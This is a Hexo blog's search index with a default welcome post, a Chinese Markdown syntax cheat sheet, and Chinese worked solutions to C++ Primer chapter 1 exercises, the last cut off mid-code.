<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hello World</title>
    <url>/2020/04/10/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
]]></content>
      <categories>
        <category>hello</category>
      </categories>
      <tags>
        <tag>hello</tag>
      </tags>
  </entry>
  <entry>
    <title>markdown基础笔记</title>
    <url>/2020/04/11/markdown%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p><strong><em>资料来源</em></strong>：<a href="https://www.runoob.com" target="_blank" rel="noopener">菜鸟教程</a>(<strong><em>侵删</em></strong>)</p>
<h2 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 一级标题 &#x2F;&#x2F;#号和标题之间需要一个空格</span><br><span class="line">## 二级标题</span><br><span class="line">.......</span><br><span class="line">###### 六级标题</span><br></pre></td></tr></table></figure>
<h2 id="段落"><a href="#段落" class="headerlink" title="段落"></a>段落</h2><h3 id="换行"><a href="#换行" class="headerlink" title="换行"></a>换行</h3><p>直接在末尾加上两个空格</p>
<h3 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*字体*</span><br><span class="line">**字体**</span><br><span class="line">***字体***</span><br><span class="line">_字体_</span><br><span class="line">__字体__</span><br><span class="line">___字体___</span><br></pre></td></tr></table></figure>
<p>显示效果：<br><em>字体</em><br><strong>字体</strong><br><strong><em>字体</em></strong><br><em>字体</em><br><strong>字体</strong><br><strong><em>字体</em></strong></p>
<h3 id="线"><a href="#线" class="headerlink" title="线"></a>线</h3><h4 id="分割线"><a href="#分割线" class="headerlink" title="分割线"></a>分割线</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、***</span><br><span class="line">2、* * *</span><br><span class="line">3、*****</span><br><span class="line">4、- - -</span><br><span class="line">5、-----</span><br></pre></td></tr></table></figure>
<hr>
<hr>
<hr>
<hr>
<hr>
<h4 id="删除线"><a href="#删除线" class="headerlink" title="删除线"></a>删除线</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">~~删除线~~</span><br></pre></td></tr></table></figure>
<p><del>删除线</del></p>
<h4 id="下划线"><a href="#下划线" class="headerlink" title="下划线"></a>下划线</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;u&gt;下划线&lt;&#x2F;u&gt;</span><br></pre></td></tr></table></figure>
<p><u>下划线</u></p>
<h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><h3 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">* 第一项</span><br><span class="line">* 第二项</span><br><span class="line">* 第三项</span><br><span class="line"></span><br><span class="line">+ 第一项</span><br><span class="line">+ 第二项</span><br><span class="line">+ 第三项</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">- 第一项</span><br><span class="line">- 第二项</span><br><span class="line">- 第三项</span><br></pre></td></tr></table></figure>
<ul>
<li>第一项</li>
<li>第二项</li>
<li>第三项</li>
</ul>
<ul>
<li>第一项</li>
<li>第二项</li>
<li>第三项</li>
</ul>
<ul>
<li>第一项</li>
<li>第二项</li>
<li>第三项</li>
</ul>
<h3 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 第一项</span><br><span class="line">2. 第二项</span><br><span class="line">3. 第三项</span><br></pre></td></tr></table></figure>
<ol>
<li>第一项</li>
<li>第二项</li>
<li>第三项</li>
</ol>
<h3 id="列表嵌套"><a href="#列表嵌套" class="headerlink" title="列表嵌套"></a>列表嵌套</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 第一项：</span><br><span class="line">    - 第一项嵌套的第一个元素</span><br><span class="line">    - 第一项嵌套的第二个元素</span><br><span class="line">2. 第二项：</span><br><span class="line">    - 第二项嵌套的第一个元素</span><br><span class="line">    - 第二项嵌套的第二个元素</span><br></pre></td></tr></table></figure>
<ol>
<li>第一项：<ul>
<li>第一项嵌套的第一个元素</li>
<li>第一项嵌套的第二个元素</li>
</ul>
</li>
<li>第二项：<ul>
<li>第二项嵌套的第一个元素</li>
<li>第二项嵌套的第二个元素</li>
</ul>
</li>
</ol>
<h2 id="区块"><a href="#区块" class="headerlink" title="区块"></a>区块</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; 区块</span><br><span class="line">&gt; 区块</span><br><span class="line">&gt; 区块</span><br><span class="line"></span><br><span class="line">&gt; 最外层 </span><br><span class="line">&gt;&gt; 第一层</span><br><span class="line">&gt;&gt;&gt; 第二层</span><br></pre></td></tr></table></figure>
<blockquote>
<p>区块<br>区块<br>区块</p>
</blockquote>
<blockquote>
<p>最外层</p>
<blockquote>
<p>第一层</p>
<blockquote>
<p>第二层</p>
</blockquote>
</blockquote>
</blockquote>
<h3 id="区块中嵌套列表"><a href="#区块中嵌套列表" class="headerlink" title="区块中嵌套列表"></a>区块中嵌套列表</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; 哈哈</span><br><span class="line">&gt; 1. hi</span><br><span class="line">&gt; 2. hihi</span><br></pre></td></tr></table></figure>
<blockquote>
<p>哈哈</p>
<ol>
<li>hi</li>
<li>hihi</li>
</ol>
</blockquote>
<h3 id="列表中嵌套区块"><a href="#列表中嵌套区块" class="headerlink" title="列表中嵌套区块"></a>列表中嵌套区块</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 第一项</span><br><span class="line">    &gt;hi</span><br><span class="line">    &gt;hi hi</span><br><span class="line">2. 第二项</span><br></pre></td></tr></table></figure>
<ol>
<li>第一项<blockquote>
<p>hi<br>hi hi</p>
</blockquote>
</li>
<li>第二项</li>
</ol>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><h3 id="方式一"><a href="#方式一" class="headerlink" title="方式一"></a>方式一</h3><p>4个空格或者一个制表符（Tab）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main (void) &#123;</span><br><span class="line">    printf(&quot;hello world!&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<pre><code>#include &lt;stdio.h&gt;
int main (void) {
    printf(&quot;hello world!&quot;);
    return 0;
}</code></pre><h3 id="方式二"><a href="#方式二" class="headerlink" title="方式二"></a>方式二</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//反引号反引号反引号c (可以指定语言也可以不指定，指定之后语法高亮)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"hello world!"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//反引号反引号反引号</span></span><br></pre></td></tr></table></figure>

<h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">简单使用：</span><br><span class="line">这是一个链接 [菜鸟教程](https:&#x2F;&#x2F;www.runoob.com)</span><br><span class="line">&lt;https:&#x2F;&#x2F;www.runoob.com&gt;</span><br><span class="line">复杂使用：</span><br><span class="line">这个链接用 1 作为网址变量 [Google][1]</span><br><span class="line">这个链接用 runoob 作为网址变量 [Runoob][runoob]</span><br><span class="line">[1]: http:&#x2F;&#x2F;www.google.com&#x2F;</span><br><span class="line">[runoob]: http:&#x2F;&#x2F;www.runoob.com&#x2F;</span><br></pre></td></tr></table></figure>
<p>这是一个链接 <a href="https://www.runoob.com" target="_blank" rel="noopener">菜鸟教程</a><br><a href="https://www.runoob.com" target="_blank" rel="noopener">https://www.runoob.com</a></p>
<h2 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h2><h3 id="markdown语法"><a href="#markdown语法" class="headerlink" title="markdown语法"></a>markdown语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">![alt 属性文本](图片地址)</span><br><span class="line">![alt 属性文本](图片地址 &quot;可选标题&quot;)</span><br><span class="line">开头一个感叹号 !</span><br><span class="line">接着一个方括号，里面放上图片的替代文字</span><br><span class="line">接着一个普通括号，里面放上图片的网址，最后还可以用引号包住并加上选择性的 &#39;title&#39; 属性的文字。</span><br></pre></td></tr></table></figure>
<h3 id="标签（markdown还无法指定宽度与高度）"><a href="#标签（markdown还无法指定宽度与高度）" class="headerlink" title="标签（markdown还无法指定宽度与高度）"></a>标签（markdown还无法指定宽度与高度）</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;static.runoob.com&#x2F;images&#x2F;runoob-logo.png&quot; width&#x3D;&quot;50%&quot;&gt;</span><br></pre></td></tr></table></figure>

<h2 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">|  表头   | 表头  |</span><br><span class="line">|  ----  | ----  |</span><br><span class="line">| 单元格  | 单元格 |</span><br><span class="line">| 单元格  | 单元格 |</span><br><span class="line">&#x2F;&#x2F;Markdown 制作表格使用 | 来分隔不同的单元格，使用 - 来分隔表头和其他行。</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>表头</th>
<th>表头</th>
</tr>
</thead>
<tbody><tr>
<td>单元格</td>
<td>单元格</td>
</tr>
<tr>
<td>单元格</td>
<td>单元格</td>
</tr>
</tbody></table>
<h3 id="对齐方式"><a href="#对齐方式" class="headerlink" title="对齐方式"></a>对齐方式</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-: 设置内容和标题栏居右对齐。</span><br><span class="line">:- 设置内容和标题栏居左对齐。</span><br><span class="line">:-: 设置内容和标题栏居中对齐。</span><br><span class="line">| 左对齐 | 右对齐 | 居中对齐 |</span><br><span class="line">| :-----| ----: | :----: |</span><br><span class="line">| 单元格 | 单元格 | 单元格 |</span><br><span class="line">| 单元格 | 单元格 | 单元格 |</span><br></pre></td></tr></table></figure>


<table>
<thead>
<tr>
<th align="left">左对齐</th>
<th align="right">右对齐</th>
<th align="center">居中对齐</th>
</tr>
</thead>
<tbody><tr>
<td align="left">单元格</td>
<td align="right">单元格</td>
<td align="center">单元格</td>
</tr>
<tr>
<td align="left">单元格</td>
<td align="right">单元格</td>
<td align="center">单元格</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>markdown</category>
      </categories>
      <tags>
        <tag>markdown</tag>
        <tag>hello</tag>
      </tags>
  </entry>
  <entry>
    <title>Primer_C++_Charpter1_Practice</title>
    <url>/2020/04/14/Primer_C++_Charpter1_Practice/</url>
    <content><![CDATA[<h2 id="文件重定向"><a href="#文件重定向" class="headerlink" title="文件重定向"></a>文件重定向</h2><p>infile与outfile都必须存在于同一目录下，需要手动创建这两个文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;创建文件，效果相同</span><br><span class="line">touch infile &amp;&amp; touch outfile</span><br><span class="line">touch infile ; touch outfile</span><br><span class="line"></span><br><span class="line">$ .&#x2F;a.out &lt;infile &gt;outfile</span><br></pre></td></tr></table></figure>
<h2 id="1-1节练习"><a href="#1-1节练习" class="headerlink" title="1.1节练习"></a>1.1节练习</h2><h3 id="1-1编译运行第一个程序"><a href="#1-1编译运行第一个程序" class="headerlink" title="1.1编译运行第一个程序"></a>1.1编译运行第一个程序</h3><p>编译运行第一个程序</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$(系统提示符) </span></span><br><span class="line"><span class="comment">//$ g++ -o 1_1 1_1.cc 编译</span></span><br><span class="line"><span class="comment">//$ ./1_1 运行</span></span><br><span class="line"><span class="comment">//$ echo $? 获取程序的返回值</span></span><br></pre></td></tr></table></figure>

<h3 id="1-2观察系统是如何处理返回值为-1的情况"><a href="#1-2观察系统是如何处理返回值为-1的情况" class="headerlink" title="1.2观察系统是如何处理返回值为-1的情况"></a>1.2观察系统是如何处理返回值为-1的情况</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 将返回值修改为-1后，执行echo $?命令来获取返回值，会发现系统返回的是数值254</span></span><br><span class="line"><span class="comment"> * 为了解决这个疑惑，尝试将返回值修改为-2，对应得到254，我们可以判断，返回值的</span></span><br><span class="line"><span class="comment"> * 数值一定在0~255之间</span></span><br><span class="line"><span class="comment"> * 相关知识链接：https://www.jb51.net/article/73377.htm</span></span><br><span class="line"><span class="comment"> * 十进制的-1 二进制的补码表示为 1111 1111。所以当返回值为-1时，从系统中回去的</span></span><br><span class="line"><span class="comment"> * 返回值为255</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<h2 id="1-2节练习"><a href="#1-2节练习" class="headerlink" title="1.2节练习"></a>1.2节练习</h2><h3 id="1-3-打印Hello-World"><a href="#1-3-打印Hello-World" class="headerlink" title="1.3 打印Hello, World"></a>1.3 打印Hello, World</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"Hello, World."</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 运行效果</span></span><br><span class="line"><span class="comment"> * Hello, World.</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h3 id="1-4-运算符-和-的使用"><a href="#1-4-运算符-和-的使用" class="headerlink" title="1.4 运算符+和*的使用"></a>1.4 运算符+和*的使用</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a1 = <span class="number">0</span>, a2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; a1 &gt;&gt; a2;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"addition: "</span> &lt;&lt; a1 &lt;&lt; <span class="string">" + "</span> &lt;&lt; a2 &lt;&lt; <span class="string">" = "</span> &lt;&lt; a1 + a2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"mutiplication: "</span> &lt;&lt; a1 &lt;&lt; <span class="string">" * "</span> &lt;&lt; a2 &lt;&lt; <span class="string">" = "</span> &lt;&lt; a1 * a2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 运行效果</span></span><br><span class="line"><span class="comment"> * input: 5 6</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * output: </span></span><br><span class="line"><span class="comment"> * addition: 5 + 6 = 11</span></span><br><span class="line"><span class="comment"> * mutiplication: 5 * 6 = 30</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h3 id="1-5-将打印操作放在单独的语句中"><a href="#1-5-将打印操作放在单独的语句中" class="headerlink" title="1.5 将打印操作放在单独的语句中"></a>1.5 将打印操作放在单独的语句中</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> a1 = <span class="number">0</span>, a2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; a1 &gt;&gt; a2;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"addition: "</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; a1;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">" + "</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; a2;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">" = "</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; a1 + a2;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"mutiplication: "</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; a1;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">" * "</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; a2;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">" = "</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; a1 * a2;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 运行效果</span></span><br><span class="line"><span class="comment"> * input: 5 6</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * output: </span></span><br><span class="line"><span class="comment"> * addition: 5 + 6 = 11</span></span><br><span class="line"><span class="comment"> * mutiplication: 5 * 6 = 30</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h3 id="1-6-观察下面语句是否合法"><a href="#1-6-观察下面语句是否合法" class="headerlink" title="1.6 观察下面语句是否合法"></a>1.6 观察下面语句是否合法</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"The sum of "</span> &lt;&lt; v1;</span><br><span class="line">          &lt;&lt; <span class="string">" and "</span> &lt;&lt; v2;</span><br><span class="line">          &lt;&lt; <span class="string">" is "</span> &lt;&lt; v1 + v2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 不合法。因为分号就代表着语句的结束，输出运算符需要两个运算数。</span></span><br><span class="line"><span class="comment"> * 第二行和第三行语句的左侧缺少一个ostream类型的对象</span></span><br><span class="line"><span class="comment"> * 修改如下</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//方法1</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"The sum of "</span> &lt;&lt; v1</span><br><span class="line">          &lt;&lt; <span class="string">" and "</span> &lt;&lt; v2</span><br><span class="line">          &lt;&lt; <span class="string">" is "</span> &lt;&lt; v1 + v2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"><span class="comment">//方法2</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"The sum of "</span> &lt;&lt; v1;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">" and "</span> &lt;&lt; v2;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">" is "</span> &lt;&lt; v1 + v2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure>
<h2 id="1-3节练习"><a href="#1-3节练习" class="headerlink" title="1.3节练习"></a>1.3节练习</h2><h3 id="1-7-编译一个不正确的嵌套注释程序，观察编译器返回的错误信息"><a href="#1-7-编译一个不正确的嵌套注释程序，观察编译器返回的错误信息" class="headerlink" title="1.7 编译一个不正确的嵌套注释程序，观察编译器返回的错误信息"></a>1.7 编译一个不正确的嵌套注释程序，观察编译器返回的错误信息</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 例子</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 注释对/**/</span>不能嵌套</span><br><span class="line"> * <span class="string">"不能嵌套"</span>几个字会被认为是源码</span><br><span class="line"> * 像剩余程序一样处理</span><br><span class="line"> */</span><br><span class="line"> <span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 编译时显示的错误</span></span><br><span class="line"><span class="comment"> * 1.7.cc:2:17: error: stray ‘\344’ in program</span></span><br><span class="line"><span class="comment"> * 注释对/**/</span>不能嵌套</span><br><span class="line"> * ......</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>

<h3 id="1-8判断语句是否合法"><a href="#1-8判断语句是否合法" class="headerlink" title="1.8判断语句是否合法"></a>1.8判断语句是否合法</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 语句</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"/*"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"*/"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="comment">/* "*/</span><span class="string">" */;</span></span><br><span class="line"><span class="string">std::cout &lt;&lt;/* "</span>*/<span class="string">" /* "</span><span class="comment">/*" */</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure>
<p>1、2、4句是对的。输出分别为：/*， */， /* 。<br>第4句可以看出这样：(/* “*/) (“ /* “) (/*“ */)</p>
<h2 id="1-4-1节练习"><a href="#1-4-1节练习" class="headerlink" title="1.4.1节练习"></a>1.4.1节练习</h2><h3 id="1-9使用while循环，将-50-100-的数相加"><a href="#1-9使用while循环，将-50-100-的数相加" class="headerlink" title="1.9使用while循环，将[50,100]的数相加"></a>1.9使用while循环，将[50,100]的数相加</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> n = <span class="number">49</span>; <span class="comment">//从49开始，因为一会要使用++i</span></span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>; <span class="comment">//定义变量，初始化为0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (++n &lt;= <span class="number">100</span>) <span class="comment">//n合法范围为 [50,100]</span></span><br><span class="line">        sum += n;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"sum = "</span> &lt;&lt; sum &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">//打印结果</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//output:sum = 3825</span></span><br></pre></td></tr></table></figure>

<h3 id="1-10学会使用-运算符和–运算符"><a href="#1-10学会使用-运算符和–运算符" class="headerlink" title="1.10学会使用++运算符和–运算符"></a>1.10学会使用++运算符和–运算符</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//打印[0,10]</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = <span class="number">11</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (--n &gt;= <span class="number">0</span>) </span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; n &lt;&lt; <span class="string">" "</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//10 9 8 7 6 5 4 3 2 1 0</span></span><br></pre></td></tr></table></figure>

<h3 id="1-11输出用户指定范围的数字"><a href="#1-11输出用户指定范围的数字" class="headerlink" title="1.11输出用户指定范围的数字"></a>1.11输出用户指定范围的数字</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">0</span>, b = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"请输入两个数:"</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; a &gt;&gt; b;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (a &lt;= b) &#123;</span><br><span class="line">     <span class="keyword">while</span> (a &lt;= b)               </span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; a++ &lt;&lt; <span class="string">" "</span>;     </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="keyword">while</span> (b &lt;= a)          